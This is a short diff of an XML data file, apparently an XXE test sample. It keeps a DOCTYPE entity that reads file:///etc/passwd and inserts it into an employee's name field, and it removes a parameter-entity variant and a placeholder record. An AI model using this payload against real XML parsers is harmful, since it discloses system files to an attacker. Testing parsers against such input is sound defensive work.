@@ -1,23 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
-  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
 ]>
-<employees>
-  <employee>
-    <name>John Doe</name>
-    <email>johndoe@example.com</email>
-    <password>password</password>
-    <phone_number>123-456-7890</phone_number>
-  </employee>
   <employee>
     <name>&xxe;</name>
-    <email>xxe@example.com</email>
-    <password>password</password>
-    <phone_number>123-456-7890</phone_number>
-  </employee>
-  <employee>
-    <name>%xxe;</name>
     <email>xxe@example.com</email>
     <password>password</password>
     <phone_number>123-456-7890</phone_number>
